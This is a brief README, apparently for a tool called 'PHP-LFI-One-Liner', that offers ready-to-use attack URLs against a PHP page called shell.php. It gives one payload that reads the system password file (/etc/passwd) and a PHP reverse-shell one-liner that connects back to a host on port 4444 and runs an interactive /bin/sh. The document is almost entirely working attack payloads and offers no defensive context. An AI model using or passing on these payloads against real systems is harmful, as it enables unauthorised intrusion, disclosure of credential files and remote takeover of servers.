# PHP-LFI-One-Liner
Simple one-liner to execute remote code on a system

  
# Example

# Dump Password file

http://10.10.10.10/shell.php?id=/etc/passwd
  
# Reverse Shell (PHP)

http://10.10.10.10/shell.php?id=php -r '$sock=fsockopen("<10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  
  
